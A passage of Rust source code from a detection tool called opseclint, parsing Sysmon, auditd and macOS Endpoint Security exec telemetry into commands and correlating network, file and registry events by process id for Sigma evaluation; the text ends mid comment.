//! Ingest recorded host telemetry — the events a sensor actually logged — and
//! reduce each to the [`Command`]s the analyzer already understands. This is the
//! complement to opseclint's predictive mode: instead of *predicting* the
//! telemetry a command would emit, it takes real telemetry and maps it back to
//! techniques, detectability, and coverage, answering "given what the sensor
//! recorded, which techniques does this represent?"
//!
//! Three sources are supported, all reducing to the same `Command` the analyzer
//! already understands so the matcher, report, and Sigma evaluation run
//! unchanged — no new matching layer:
//!
//! - Windows **Sysmon Event ID 1** (Process Create), exported as JSON. Its
//!   `Image` / `CommandLine` / `OriginalFileName` fields are exactly the event
//!   model [`crate::sigma_eval`] synthesizes from a command line.
//! - Linux **auditd** `execve` events, as raw `audit.log` text. The multi-line
//!   `SYSCALL` / `EXECVE` / `CWD` records of one event are reassembled by their
//!   `audit(…)` id, the argv rebuilt from the `EXECVE` fields, and the program
//!   taken from the `SYSCALL` `exe` path.
//! - macOS **Endpoint Security** `NOTIFY_EXEC` events, as `eslogger exec` JSON.
//!   The new image and argv come from `event.exec.target` / `event.exec.args`,
//!   and — unlike auditd — the calling process (`process.executable.path`) gives
//!   a real `ParentImage`.
//!
//! This is an *observation* front-end: it describes what a defender's sensor
//! saw. Like the rest of opseclint it encodes detectability only, never evasion.
//!
//! Only process-execution records are ingested. A file that mixes in other event
//! classes (network / file / registry) has those records **skipped and
//! counted** — surfaced to the user, never silently dropped.

use std::collections::HashMap;
use std::sync::Arc;

use serde_json::Value;

use crate::model::SideEffect;
use crate::parser::{self, Command};

/// A telemetry format opseclint can ingest. All three reduce to the same
/// `Command` behind the same `--telemetry` input path.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[cfg_attr(feature = "clap", derive(clap::ValueEnum))]
pub enum Format {
    /// Windows Sysmon Event ID 1 (Process Create), JSON — a top-level array of
    /// event objects, or one JSON object per line (JSONL).
    Sysmon,
    /// Linux auditd process-execution events, raw `audit.log` text — the
    /// multi-line `SYSCALL` / `EXECVE` / `CWD` records for one `execve`,
    /// reassembled by their `audit(…)` event id.
    Auditd,
    /// macOS Endpoint Security `NOTIFY_EXEC` events, as `eslogger exec` JSON — a
    /// top-level array, a single object, or JSONL. Carries the calling process,
    /// so it supplies a real `ParentImage`.
    Esf,
}

/// One ingested telemetry record reduced to the analyzer's unit shape: the
/// commands resolved from the event, the raw command line the sensor recorded,
/// and the field map of the event. `record` is the 1-based position of the
/// source record (used as the finding's line number, so a finding points back at
/// the record it came from). `event` carries the fields a command line can't
/// supply — `ParentImage`, `User`, `IntegrityLevel`, … — so Sigma evaluation can
/// resolve rules keyed on them against the real event. Known Sysmon EID 1 fields
/// are keyed by their canonical name (see `canonical_field`); any other keys
/// keep their original casing. Wrapped in an `Arc` so the several findings a
/// record produces share one map instead of each deep-cloning it.
#[derive(Debug, Clone)]
pub struct Observation {
    /// 1-based position of the source record in the ingested file. Becomes the
    /// finding's line number, so a finding points back at the record it came
    /// from.
    pub record: usize,
    /// The commands resolved from this event — usually one, more when the
    /// recorded command line itself contains a pipeline or substitution.
    pub commands: Vec<Command>,
    /// The command line exactly as the sensor recorded it.
    pub raw: String,
    /// The event's field map: the fields a command line cannot supply
    /// (`ParentImage`, `User`, `IntegrityLevel`, …), so Sigma evaluation can
    /// resolve rules keyed on them against what was really logged. Known Sysmon
    /// EID 1 fields are keyed by their canonical name; any other key keeps its
    /// original casing. `Arc` so the several findings one record produces share
    /// a single map.
    pub event: Arc<HashMap<String, String>>,
    /// Non-execution events (network / file / registry) correlated to this
    /// execution by pid — confirmed secondary telemetry.
    pub side_effects: Vec<SideEffect>,
}

/// The result of ingesting a telemetry file: the process-execution observations
/// to analyze, how many records were skipped as their own units, and the
/// non-execution events that did not correlate to any execution — matched
/// standalone against the KB's `event` axis.
#[derive(Debug, Clone)]
pub struct Ingest {
    /// The process-execution records, in file order.
    pub observations: Vec<Observation>,
    /// How many records were not ingested as their own unit — non-execution
    /// event classes, and malformed records. Counted rather than silently
    /// dropped: report it, so a thin result is distinguishable from a quiet
    /// host.
    pub skipped: usize,
    /// Non-execution events that did not correlate back to any captured
    /// execution, matched standalone against the knowledge base's `event` axis.
    pub event_observations: Vec<EventObservation>,
}

/// A non-execution event (network / file / registry) that did not correlate to a
/// captured execution — so it is matched on its own, by the KB `event` axis,
/// against the recorded field map. Its causing process was either not in the file
/// or was not a process launch (e.g. a GUI-set registry Run key).
#[derive(Debug, Clone)]
pub struct EventObservation {
    /// 1-based position of the source record in the ingested file.
    pub record: usize,
    /// Short event-class tag: `network`, `file`, or `registry`.
    pub class: String,
    /// The human-readable phrase describing what was observed.
    pub detail: String,
    /// The event's recorded field map, keyed as in [`Observation::event`].
    pub event: Arc<HashMap<String, String>>,
}

/// A uid → user-name map, from a `passwd`-format file (see [`parse_passwd`]).
pub type UserMap = HashMap<String, String>;

/// Parse recorded telemetry `text` in the given `format` into observations, with
/// no uid→name mapping. The ergonomic default; reach for [`parse_with_users`]
/// when you have a `passwd` map to resolve numeric uids against (opseclint's
/// `--users`).
pub fn parse(text: &str, format: Format) -> Result<Ingest, String> {
    parse_with_users(text, format, &UserMap::new())
}

/// Like [`parse`], but resolves numeric uids to names via `users` (from
/// `--users`). Only auditd carries a numeric uid today; Sysmon already names the
/// user and ESF's audit-token uid is a follow-on.
pub fn parse_with_users(text: &str, format: Format, users: &UserMap) -> Result<Ingest, String> {
    match format {
        Format::Sysmon => parse_sysmon(text),
        Format::Auditd => parse_auditd(text, users),
        Format::Esf => parse_esf(text),
    }
}

/// Parse a `passwd`-format file into a uid → name map: each `name:x:uid:…` line
/// contributes `uid -> name`. Lines with fewer than three colon fields (comments,
/// blanks) are ignored.
pub fn parse_passwd(text: &str) -> UserMap {
    let mut map = UserMap::new();
    for line in text.lines() {
        let fields: Vec<&str> = line.split(':').collect();
        if fields.len() >= 3 && !fields[0].is_empty() && !fields[2].is_empty() {
            map.insert(fields[2].to_string(), fields[0].to_string());
        }
    }
    map
}

fn parse_sysmon(text: &str) -> Result<Ingest, String> {
    let events = read_events(text)?;
    let mut observations: Vec<Observation> = Vec::new();
    let mut event_observations: Vec<EventObservation> = Vec::new();
    // pid -> index of the most recent execution seen so far with that pid.
    // Correlating in file order to the latest prior execution attributes a
    // side-effect to the right process even when a pid is reused within the file
    // (a process exits and the id is recycled), and keeps correlation linear.
    let mut latest_by_pid: HashMap<String, usize> = HashMap::new();
    let mut skipped = 0;
    for (i, ev) in events.iter().enumerate() {
        let fields = flatten_fields(ev);
        match reduce_process_create(&fields) {
            Some((commands, raw)) => {
                if let Some(p) = fields.get("ProcessId") {
                    latest_by_pid.insert(p.clone(), observations.len());
                }
                observations.push(Observation {
                    record: i + 1,
                    commands,
                    raw,
                    event: Arc::new(fields),
                    side_effects: Vec::new(),
                });
            }
            None => {
                // A non-process-creation record is not analyzed as its own unit,
                // but a recognized network/file/registry event is kept: attached to
                // the execution that most recently held its pid, or — with no such
                // execution — as a standalone event matched against the KB `event`
                // axis.
                skipped += 1;
                if let Some((class, detail)) = sysmon_event(&fields) {
                    match fields.get("ProcessId").and_then(|p| latest_by_pid.get(p)) {
                        Some(&idx) => observations[idx]
                            .side_effects
                            .push(SideEffect { class, detail }),
                        None => event_observations.push(EventObservation {
                            record: i + 1,
                            class,
                            detail,
                            event: Arc::new(fields),
                        }),
                    }
                }
            }
        }
    }
    Ok(Ingest {
        observations,
        skipped,
        event_observations,
    })
}

/// The class (`network` / `file` / `registry`) and human detail of a Sysmon
/// network (EID 3), file-create (EID 11), or registry (EID 13) record, or `None`.
fn sysmon_event(fields: &HashMap<String, String>) -> Option<(String, String)> {
    let get = |k: &str| fields.get(k).map(String::as_str).filter(|v| !v.is_empty());
    let (class, detail) = match fields.get("EventID").map(String::as_str) {
        Some("3") => {
            let host = get("DestinationIp").or_else(|| get("DestinationHostname"))?;
            let detail = match get("DestinationPort") {
                Some(port) => format!("network connection to {host}:{port}"),
                None => format!("network connection to {host}"),
            };
            ("network", detail)
        }
        Some("11") => ("file", format!("file created {}", get("TargetFilename")?)),
        Some("13") => ("registry", format!("registry set {}", get("TargetObject")?)),
        _ => return None,
    };
    Some((class.to_string(), detail))
}

/// Canonical Sysmon Event ID 1 field names. Ingested records arrive with varied
/// casing and nesting; canonicalizing on the way in lets both the reduction and
/// the Sigma evaluator address a field by the standard name a rule references
/// (e.g. a `ParentImage|endswith` selection). Unrecognized keys are kept as-is.
const SYSMON_FIELDS: &[&str] = &[
    "EventID",
    "Image",
    "CommandLine",
    "OriginalFileName",
    "CurrentDirectory",
    "User",
    "IntegrityLevel",
    "Hashes",
    "Company",
    "Description",
    "Product",
    "FileVersion",
    "ParentImage",
    "ParentCommandLine",
    "ParentUser",
    "ParentProcessId",
    "ProcessId",
    "LogonId",
    "TerminalSessionId",
    // Non-execution fields used for side-effect correlation (EID 3 / 11 / 13).
    "DestinationIp",
    "DestinationPort",
    "DestinationHostname",
    "TargetFilename",
    "TargetObject",
    "EventType",
];

/// Map an incoming field key to its canonical Sysmon name (case-insensitively),
/// normalizing the Elastic `winlog` `event_id` alias to `EventID`.
fn canonical_field(key: &str) -> String {
    if key.eq_ignore_ascii_case("event_id") {
        return "EventID".to_string();
    }
    SYSMON_FIELDS
        .iter()
        .find(|f| key.eq_ignore_ascii_case(f))
        .map(|f| f.to_string())
        .unwrap_or_else(|| key.to_string())
}

/// Read a telemetry document into a flat list of event values, accepting the
/// three shapes real exporters produce: a top-level JSON array of events, a
/// single JSON object, or JSONL (one JSON object per line).
fn read_events(text: &str) -> Result<Vec<Value>, String> {
    let trimmed = text.trim_start();
    if trimmed.starts_with('[') {
        let v: Value =
            serde_json::from_str(text).map_err(|e| format!("invalid JSON array: {e}"))?;
        return match v {
            Value::Array(items) => Ok(items),
            _ => Err("expected a JSON array of events".to_string()),
        };
    }
    // A single JSON object spanning the whole input (possibly pretty-printed).
    if trimmed.starts_with('{')
        && let Ok(v) = serde_json::from_str::<Value>(text)
    {
        return Ok(vec![v]);
    }
    // JSONL: one JSON value per non-empty line.
    let mut out = Vec::new();
    for (n, line) in text.lines().enumerate() {
        let l = line.trim();
        if l.is_empty() {
            continue;
        }
        let v: Value =
            serde_json::from_str(l).map_err(|e| format!("invalid JSON on line {}: {e}", n + 1))?;
        out.push(v);
    }
    if out.is_empty() {
        return Err("no telemetry records found".to_string());
    }
    Ok(out)
}

/// Flatten an event object into a map of scalar fields keyed by canonical Sysmon
/// field name, descending through the container objects different exporters wrap
/// event data in (`EventData`, Elastic's `winlog.event_data`, an outer `Event`,
/// …) and the EVTX→JSON `{ "@Name": "Image", "#text": "…" }` array shape.
/// Top-level scalars win over nested ones, which is correct: flat Sysmon JSON
/// carries the fields at the top level, and the nested shapes carry them only
/// when the top level does not. Canonical names let the reduction and the Sigma
/// evaluator address a field by the standard name a rule references.
fn flatten_fields(ev: &Value) -> HashMap<String, String> {
    let mut out = HashMap::new();
    collect_scalars(ev, &mut out, 0);
    out
}

fn collect_scalars(v: &Value, out: &mut HashMap<String, String>, depth: usize) {
    // Guard against pathological nesting; real telemetry wraps two, maybe three
    // levels deep.
    if depth > 4 {
        return;
    }
    let Some(map) = v.as_object() else { return };

    // Two passes so precedence is by depth, not by key order: insert every
    // scalar at this level first, then descend. With `or_insert` (first write
    // wins), a shallower field always wins over an equivalent deeper one —
    // regardless of the order the serializer yields keys in. That is what makes
    // a flat top-level field win over the same field nested in `EventData`.
    for (k, val) in map {
        if let Some(s) = value_scalar(val) {
            out.entry(canonical_field(k)).or_insert(s);
        }
    }
    for val in map.values() {
        match val {
            Value::Object(_) => collect_scalars(val, out, depth + 1),
            Value::Array(items) => {
                for item in items {
                    // The EVTX→JSON name/value shape: each entry names one field.
                    let obj = item.as_object();
                    let name = obj
                        .and_then(|o| o.get("@Name").or_else(|| o.get("Name")))
                        .and_then(Value::as_str);
                    let text = obj.and_then(|o| o.get("#text").or_else(|| o.get("text")));
                    match (name, text) {
                        (Some(name), Some(text)) => {
                            if let Some(s) = value_scalar(text) {
                                out.entry(canonical_field(name)).or_insert(s);
                            }
                        }
                        _ => collect_scalars(item, out, depth + 1),
                    }
                }
            }
            _ => {}
        }
    }
}

fn value_scalar(v: &Value) -> Option<String> {
    match v {
        Value::String(s) => Some(s.clone()),
        Value::Number(n) => Some(n.to_string()),
        Value::Bool(b) => Some(b.to_string()),
        _ => None,
    }
}

/// Reduce a flattened event to `(commands, raw)` if it is a process-creation
/// record, else `None` (so the caller can count it as skipped).
///
/// A record is process-creation when its event id is `1`, or — when no event id
/// is present (some Sysmon-only EID 1 exports omit it) — when it carries a
/// command line. Requiring the command line in the id-less case is what keeps a
/// network (EID 3) or file (EID 11) record, which carries an `Image` but no
/// `CommandLine`, from being misread as a process launch.
fn reduce_process_create(fields: &HashMap<String, String>) -> Option<(Vec<Command>, String)> {
    // Fields are canonically named by `flatten_fields`, so the Sysmon standard
    // names address them directly.
    let event_id = fields.get("EventID");
    let command_line = fields.get("CommandLine").map(String::as_str).unwrap_or("");
    let is_process_create = match event_id {
        Some(id) => id.trim() == "1",
        None => !command_line.trim().is_empty(),
    };
    if !is_process_create {
        return None;
    }
    execution_from_fields(fields)
}

/// Resolve `(commands, raw)` for a process launch from a canonical field map,
/// shared by every ingest format. Prefers the recorded `CommandLine` as the raw
/// text, falling back to the `Image` path when no command line was logged; then
/// tokenizes it with the shell parser (wrapper stripping, quote handling, and
/// compound-line splitting all come for free) and trusts `Image` for the primary
/// program's basename — the authoritative executable path, matched with the same
/// normalization the KB keys on. `None` when there is nothing to analyze.
fn execution_from_fields(fields: &HashMap<String, String>) -> Option<(Vec<Command>, String)> {
    let command_line = fields.get("CommandLine").map(String::as_str).unwrap_or("");
    let image = fields.get("Image").map(String::as_str).unwrap_or("");
    let raw = if command_line.trim().is_empty() {
        image.to_string()
    } else {
        command_line.to_string()
    };
    if raw.trim().is_empty() {
        return None;
    }

    let mut commands = parser::parse_line(&raw);
    if !image.trim().is_empty() {
        let program = parser::basename(image);
        match commands.first_mut() {
            Some(first) => first.program = program,
            None => commands.push(Command {
                program,
                args: Vec::new(),
                raw: raw.clone(),
            }),
        }
    }
    Some((commands, raw))
}

// ---------------------------------------------------------------------------
// Linux auditd
// ---------------------------------------------------------------------------

/// One parsed auditd record line: its `type`, the `audit(…)` event id that ties
/// the multi-line records of a single event together, and its `key=value`
/// fields (values kept as the raw token — quoted or hex — for `decode_value`).
struct AuditRecord {
    kind: String,
    event_id: String,
    fields: HashMap<String, String>,
}

/// Ingest raw auditd log text. Records are reassembled into events by their
/// `audit(<ts>:<serial>)` id; an event that carries an `EXECVE` record is a
/// process execution and reduces to a `Command`, with the argv rebuilt from the
/// `EXECVE` `a0…aN` fields, the program from the `SYSCALL` `exe` path, and the
/// working directory from the `CWD` record.
///
/// An event with no `EXECVE` is not a process launch, but it is not thrown away
/// either: a `SOCKADDR` record makes it a `network` event and a `PATH` record a
/// `file` one (see [`auditd_event`]). Those are correlated to the execution that
/// most recently held their `pid` and attached as side-effects, or — with no such
/// execution — kept as standalone [`EventObservation`]s for the knowledge base's
/// `event` axis, exactly as the Sysmon path does. Anything else is skipped and
/// counted.
///
/// Only fields opseclint can map honestly are carried onto the event: auditd
/// records the parent as a numeric `ppid` (no path), so `ParentImage` is absent
/// and parent-keyed rules stay indeterminate; and it records a numeric `uid`,
/// which is mapped onto the name-based `User` field **only** when `--users`
/// supplies the uid→name mapping — otherwise it is left unresolved rather than
/// guessed (mapping `0` to `root` blindly would risk a false `no-fire`).
fn parse_auditd(text: &str, users: &UserMap) -> Result<Ingest, String> {
    let mut order: Vec<String> = Vec::new();
    let mut groups: HashMap<String, Vec<AuditRecord>> = HashMap::new();
    for line in text.lines() {
        if let Some(rec) = parse_audit_record(line) {
            if !groups.contains_key(&rec.event_id) {
                order.push(rec.event_id.clone());
            }
            groups.entry(rec.event_id.clone()).or_default().push(rec);
        }
    }
    if order.is_empty() {
        return Err("no auditd records found".to_string());
    }

    let mut observations: Vec<Observation> = Vec::new();
    let mut event_observations: Vec<EventObservation> = Vec::new();
    // pid -> index of the most recent execution with that pid, so a non-execution
    // event attributes to the right process even when a pid is reused within the
    // file. Mirrors the Sysmon path.
    let mut latest_by_pid: HashMap<String, usize> = HashMap::new();
    let mut skipped = 0;
    for (idx, id) in order.iter().enumerate() {
        let recs = &groups[id];
        let syscall = recs.iter().find(|r| r.kind == "SYSCALL");
        // `pid` is numeric and never quoted or hex-encoded, so it is taken raw:
        // `decode_value` would read "1203" as valid hex and decode it to bytes.
        let pid = syscall.and_then(|s| s.fields.get("pid")).cloned();
        let execve = recs.iter().find(|r| r.kind == "EXECVE");
        // An EXECVE record is emitted only for execve/execveat, so its presence
        // is an arch-independent signal that this event is a process launch.
        let Some(execve) = execve else {
            // Not a launch. A recognized network/file event still carries meaning:
            // attach it to the execution that most recently held its pid, or keep
            // it as a standalone observation for the `event` axis.
            skipped += 1;
            if let Some((class, detail, mut fields)) = auditd_event(recs) {
                if let Some(pid) = &pid {
                    fields.insert("ProcessId".to_string(), pid.clone());
                }
                match pid.as_ref().and_then(|p| latest_by_pid.get(p)) {
                    Some(&i) => observations[i]
                        .side_effects
                        .push(SideEffect { class, detail }),
                    None => event_observations.push(EventObservation {
                        record: idx + 1,
                        class,
                        detail,
                        event: Arc::new(fields),
                    }),
                }
            }
            continue;
        };

        let mut fields = HashMap::new();
        let cmdline = build_execve_cmdline(&execve.fields);
        if !cmdline.is_empty() {
            fields.insert("CommandLine".to_string(), cmdline);
        }
        if let Some(syscall) = syscall {
            // Resolve the numeric uid to a name only when `--users` maps it.
            if let Some(uid) = syscall.fields.get("uid")
                && let Some(name) = users.get(uid)
            {
                fields.insert("User".to_string(), name.clone());
            }
            if let Some(exe) = syscall.fields.get("exe") {
                let exe = decode_value(exe);
                if !exe.is_empty() {
                    fields.insert("Image".to_string(), exe);
                }
            }
            // The controlling tty and the audit rule tag (`key`) — extra context
            // auditd records that a rule may key on. Each is carried only when the
            // SYSCALL record includes it; a `(none)` tty is dropped.
            for (src, dst) in [("tty", "tty"), ("key", "key")] {
                if let Some(v) = syscall.fields.get(src) {
                    let v = decode_value(v);
                    if !v.is_empty() && v != "(none)" {
                        fields.insert(dst.to_string(), v);
                    }
                }
            }
        }
        if let Some(cwd) = recs.iter().find(|r| r.kind == "CWD")
            && let Some(dir) = cwd.fields.get("cwd")
        {
            let dir = decode_value(dir);
            if !dir.is_empty() {
                fields.insert("CurrentDirectory".to_string(), dir);
            }
        }

        // The pid the non-execution events correlate against, carried onto the
        // event so an `event`-axis entry and observed Sigma evaluation see the
        // same field the other two formats supply.
        if let Some(pid) = &pid {
            fields.insert("ProcessId".to_string(), pid.clone());
        }

        match execution_from_fields(&fields) {
            Some((commands, raw)) => {
                if let Some(pid) = pid {
                    latest_by_pid.insert(pid, observations.len());
                }
                observations.push(Observation {
                    // The event's ordinal position in the source log (skipped
                    // events consume a number too), so a finding points back at
                    // the right event — matching the Sysmon path's `record`.
                    record: idx + 1,
                    commands,
                    raw,
                    event: Arc::new(fields),
                    side_effects: Vec::new(),
                });
            }
            None => skipped += 1,
        }
    }
    Ok(Ingest {
        observations,
        skipped,
        event_observations,
    })
}

/// The class, human detail and field map of a non-execution auditd event, or
/// `None` when the event carries nothing opseclint can read.
///
/// The auditd counterpart of [`sysmon_event`]: a `SOCKADDR` record makes the event
/// a `network` connection, a `PATH` record makes it a `file` access. Fields are
/// keyed by the same canonical Sysmon names the rest of the ingest uses
/// (`DestinationIp`, `DestinationPort`, `TargetFilename`), so one knowledge-base
/// entry can be written once and match on any platform that reports the class.
///
/// Only successful syscalls are reported. auditd records failed calls too, but a
/// `connect()` that never completed is not the action an entry describes, and
/// reporting it as observed telemetry would overstate what happened.
fn auditd_event(recs: &[AuditRecord]) -> Option<(String, String, HashMap<String, String>)> {
    let syscall = recs.iter().find(|r| r.kind == "SYSCALL");
    if let Some(s) = syscall
        && let Some(success) = s.fields.get("success")
        && decode_value(success) != "yes"
    {
        return None;
    }
    let mut fields = HashMap::new();

    if let Some(sockaddr) = recs.iter().find(|r| r.kind == "SOCKADDR")
        && let Some(saddr) = sockaddr.fields.get("saddr")
        && let Some((ip, port)) = decode_saddr(&decode_value(saddr))
    {
        fields.insert("DestinationIp".to_string(), ip.clone());
        let detail = match &port {
            Some(p) => {
                fields.insert("DestinationPort".to_string(), p.clone());
                format!("network connection to {ip}:{p}")
            }
            None => format!("network connection to {ip}"),
        };
        return Some(("network".to_string(), detail, fields));
    }

    // A `PATH` record names a filesystem object the syscall touched. `nametype`
    // says how: `PARENT` is only the containing directory an operation resolved
    // through, never the object itself, so it is not an observation of its own.
    let path = recs.iter().find(|r| {
        r.kind == "PATH"
            && r.fields
                .get("nametype")
                .map(|n| decode_value(n))
                .is_none_or(|n| n != "PARENT")
    })?;
    let name = decode_value(path.fields.get("name")?);
    if name.is_empty() {
        return None;
    }
    let created = path
        .fields
        .get("nametype")
        .map(|n| decode_value(n))
        .is_some_and(|n| n == "CREATE");
    let detail = if created {
        format!("file created {name}")
    } else {
        format!("file opened {name}")
    };
    fields.insert("TargetFilename".to_string(), name);
    Some(("file".to_string(), detail, fields))
}

/// Decode an auditd `SOCKADDR` `saddr` hex blob into a destination address and
/// port. The blob is a raw `struct sockaddr`, so this works on bytes rather than
/// reusing [`hex_decode`] — that helper requires valid UTF-8, and an address such
/// as `C0000210` (192.0.2.16) is not.
///
/// `AF_INET` and `AF_INET6` are decoded; everything else (`AF_UNIX`, netlink, …)
/// returns `None`. A unix socket path is not a destination host, and inventing
/// one would be a fabricated answer where an honest absence is available.
fn decode_saddr(hex: &str) -> Option<(String, Option<String>)> {
    let bytes: Option<Vec<u8>> = (0..hex.len().saturating_sub(1))
        .step_by(2)
        .map(|i| u8::from_str_radix(hex.get(i..i + 2)?, 16).ok())
        .collect();
    let b = bytes?;
    if b.len() < 4 {
        return None;
    }
    // `sa_family` is a host-order u16; every architecture opseclint targets is
    // little-endian, which is also how auditd emits it.
    let family = u16::from_le_bytes([b[0], b[1]]);
    let port = u16::from_be_bytes([b[2], b[3]]);
    let port = (port != 0).then(|| port.to_string());
    match family {
        // AF_INET
        2 if b.len() >= 8 => Some((format!("{}.{}.{}.{}", b[4], b[5], b[6], b[7]), port)),
        // AF_INET6
        10 if b.len() >= 24 => {
            let groups: Vec<String> = b[8..24]
                .chunks(2)
                .map(|c| format!("{:x}", u16::from_be_bytes([c[0], c[1]])))
                .collect();
            Some((groups.join(":"), port))
        }
        _ => None,
    }
}

/// Parse one auditd log line into a record, or `None` if it is not an
/// `type=… msg=audit(…)` line (blank lines, `ausearch` `----` separators, …).
fn parse_audit_record(line: &str) -> Option<AuditRecord> {
    let fields = parse_kv(line);
    let kind = fields.get("type").map(|v| decode_value(v))?;
    let event_id = fields.get("msg").and_then(|m| event_id_from_msg(m))?;
    Some(AuditRecord {
        kind,
        event_id,
        fields,
    })
}

/// Extract the `<ts>:<serial>` event id from an auditd `msg` value such as
/// `audit(1626898254.123:45)`. The exact timestamp shape doesn't matter — the
/// same string across an event's records is all that's needed to group them.
fn event_id_from_msg(msg: &str) -> Option<String> {
    let start = msg.find("audit(")? + "audit(".len();
    let end = msg[start..].find(')')? + start;
    Some(msg[start..end].to_string())
}

/// Rebuild an `execve` command line from an `EXECVE` record's `a0`, `a1`, …
/// argument fields, in order, each decoded (quoted or hex). Stops at the first
/// gap. Argument chunking (`a1_len` + `a1[0]`…) for oversized args is not
/// reassembled — a documented limitation.
///
/// auditd hands us the *exact* argv, already split; the shared reducer then
/// re-tokenizes the joined line with the shell parser. So each argument is
/// re-quoted if it holds anything the parser would act on (whitespace, quotes, a
/// separator), keeping the reconstructed boundaries identical to what the sensor
/// recorded rather than letting one argument split into several.
fn build_execve_cmdline(fields: &HashMap<String, String>) -> String {
    let mut args = Vec::new();
    let mut i = 0;
    while let Some(v) = fields.get(&format!("a{i}")) {
        args.push(shell_quote_arg(&decode_value(v)));
        i += 1;
    }
    args.join(" ")
}

/// Quote a decoded argv element for the shell tokenizer so it round-trips as one
/// token. Values made only of characters the parser treats literally are left
/// bare; anything else is wrapped in a quote it does not itself contain (double
/// preferred). The parser toggles on quotes without honoring backslash escapes,
/// so an argument holding *both* quote kinds can't round-trip perfectly — a rare,
/// documented edge that is no worse than leaving it unquoted.
fn shell_quote_arg(arg: &str) -> String {
    let is_bare = !arg.is_empty()
        && arg.bytes().all(|b| {
            b.is_ascii_alphanumeric()
                || matches!(
                    b,
                    b'-' | b'_' | b'.' | b'/' | b':' | b'=' | b'@' | b',' | b'+' | b'%'
                )
        });
    if is_bare {
        return arg.to_string();
    }
    if !arg.contains('"') {
        format!("\"{arg}\"")
    } else {
        format!("'{arg}'")
    }
}

/// Decode an auditd field value: strip surrounding quotes, or hex-decode when it
/// is an unquoted even-length run of hex digits (auditd hex-encodes values that
/// contain spaces, quotes, or control characters). Anything else is literal.
/// Applied only to string-valued fields (`exe`, `cwd`, argv), never to numeric
/// ones like `uid`, so a value like `pid=5678` is never mistaken for hex.
fn decode_value(v: &str) -> String {
    let v = v.trim();
    if v.len() >= 2 && v.starts_with('"') && v.ends_with('"') {
        return v[1..v.len() - 1].to_string();
    }
    if v.len() >= 2
        && v.len().is_multiple_of(2)
        && v.bytes().all(|b| b.is_ascii_hexdigit())
        && let Some(decoded) = hex_decode(v)
    {
        return decoded;
    }
    v.to_string()
}

/// Decode a hex string to UTF-8, or `None` if it isn't valid UTF-8. auditd uses
/// a NUL to separate concatenated fields (e.g. proctitle); a trailing NUL is
/// trimmed so a decoded exe path stays clean.
fn hex_decode(s: &str) -> Option<String> {
    let bytes: Option<Vec<u8>> = (0..s.len())
        .step_by(2)
        .map(|i| u8::from_str_radix(&s[i..i + 2], 16).ok())
        .collect();
    let mut bytes = bytes?;
    while bytes.last() == Some(&0) {
        bytes.pop();
    }
    String::from_utf8(bytes).ok()
}

/// Parse a line of space-separated auditd `key=value` tokens into a map,
/// respecting double-quoted values that contain spaces. Values are stored as
/// their raw token (quotes/hex intact) for `decode_value` to interpret. Tokens
/// without `=` (a leading `node=` is a normal kv; a bare word is not) are
/// skipped.
fn parse_kv(s: &str) -> HashMap<String, String> {
    let mut out = HashMap::new();
    let bytes = s.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        while i < bytes.len() && bytes[i] == b' ' {
            i += 1;
        }
        if i >= bytes.len() {
            break;
        }
        let key_start = i;
        while i < bytes.len() && bytes[i] != b'=' && bytes[i] != b' ' {
            i += 1;
        }
        if i >= bytes.len() || bytes[i] != b'=' {
            // No '=': skip to the next token.
            while i < bytes.len() && bytes[i] != b' ' {
                i += 1;
            }
            continue;
        }
        let key = &s[key_start..i];
        i += 1; // skip '='
        let val_start = i;
        let val_end = if i < bytes.len() && bytes[i] == b'"' {
            i += 1;
            while i < bytes.len() && bytes[i] != b'"' {
                i += 1;
            }
            if i < bytes.len() {
                i += 1; // include the closing quote
            }
            i
        } else {
            while i < bytes.len() && bytes[i] != b' ' {
                i += 1;
            }
            i
        };
        out.insert(key.to_string(), s[val_start..val_end].to_string());
    }
    out
}

// ---------------------------------------------------------------------------
// macOS Endpoint Security (eslogger)
// ---------------------------------------------------------------------------

/// Ingest macOS Endpoint Security `NOTIFY_EXEC` telemetry, as produced by
/// `eslogger exec` — a top-level JSON array, a single object, or JSONL, read by
/// the same [`read_events`] the Sysmon path uses. Every record carrying an
/// `event.exec` object is a process execution.
///
/// ESF exec semantics: `event.exec.target` is the *new* process (its
/// `executable.path` and `event.exec.args` are the launched image and argv),
/// while the message's top-level `process` is the caller that invoked `exec` —
/// so its `executable.path` is the parent image a defender's rules key on. That
/// is what lets ESF resolve `ParentImage`-keyed detections where auditd cannot.
///
/// Non-exec messages are not executions but are not featureless either: an
/// `open` / `create` / `connect` becomes a `file` or `network` event (see
/// [`esf_event`]), correlated to the execution that most recently held its
/// audit-token pid or kept standalone for the knowledge base's `event` axis,
/// exactly as the Sysmon and auditd paths do. Anything else is skipped and
/// counted.
fn parse_esf(text: &str) -> Result<Ingest, String> {
    let events = read_events(text)?;
    let mut observations: Vec<Observation> = Vec::new();
    let mut event_observations: Vec<EventObservation> = Vec::new();
    // pid -> index of the most recent execution with that pid; see `parse_sysmon`.
    let mut latest_by_pid: HashMap<String, usize> = HashMap::new();
    let mut skipped = 0;
    for (i, ev) in events.iter().enumerate() {
        match reduce_esf(ev) {
            Some(fields) => match execution_from_fields(&fields) {
                Some((commands, raw)) => {
                    if let Some(pid) = fields.get("ProcessId") {
                        latest_by_pid.insert(pid.clone(), observations.len());
                    }
                    observations.push(Observation {
                        record: i + 1,
                        commands,
                        raw,
                        event: Arc::new(fields),
                        side_effects: Vec::new(),
                    });
                }
                None => skipped += 1,
            },
            None => {
                skipped += 1;
                if let Some((class, detail, mut fields)) = esf_event(ev) {
                    // The emitting process is the message's top-level `process`,
                    // whose audit token names the pid to correlate on.
                    let pid = esf_pid(ev.get("process"));
                    if let Some(pid) = &pid {
                        fields.insert("ProcessId".to_string(), pid.clone());
                    }
                    if let Some(image) = nested_str(ev, &["process", "executable", "path"]) {
                        insert_nonempty(&mut fields, "Image", image);
                    }
                    match pid.as_ref().and_then(|p| latest_by_pid.get(p)) {
                        Some(&idx) => observations[idx]
                            .side_effects
                            .push(SideEffect { class, detail }),
                        None => event_observations.push(EventObservation {
                            record: i + 1,
                            class,
                            detail,
                            event: Arc::new(fields),
                        }),
                    }
                }
            }
        }
    }
    Ok(Ingest {
        observations,
        skipped,
        event_observations,
    })
}

/// The class, human detail and field map of a non-execution ESF message, or
/// `None` when it is an exec (handled by [`reduce_esf`]) or a class opseclint does
/// not read.
///
/// The ESF counterpart of [`sysmon_event`] and [`auditd_event`], keyed by the same
/// canonical field names so one knowledge-base entry serves every platform that
